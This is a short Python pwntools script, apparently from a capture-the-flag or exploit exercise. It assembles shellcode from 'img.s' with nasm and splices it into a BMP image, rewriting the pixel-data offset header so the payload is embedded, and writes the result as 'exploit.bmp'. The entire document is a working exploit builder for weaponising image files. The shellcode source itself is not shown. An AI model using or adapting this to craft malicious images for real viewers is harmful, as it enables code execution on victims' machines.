from pwn import *
import os

with tempfile.NamedTemporaryFile() as f_out:
    cmd = " ".join(["nasm", "-o", f_out.name, "img.s"])
    os.system(cmd)
    payload = f_out.read()

with open('you_get_a_calc.bmp', 'rb') as f:
    img = f.read()

orig = u32(img[0xa:0xa+4])

exploit = img[:0xa] + p32(0xd8+len(payload)) + img[0xa+4:orig]
exploit = exploit.ljust(0xd8, b'\x00')
exploit += payload
exploit += img[orig:]

with open('exploit.bmp', 'wb') as f:
    f.write(exploit)
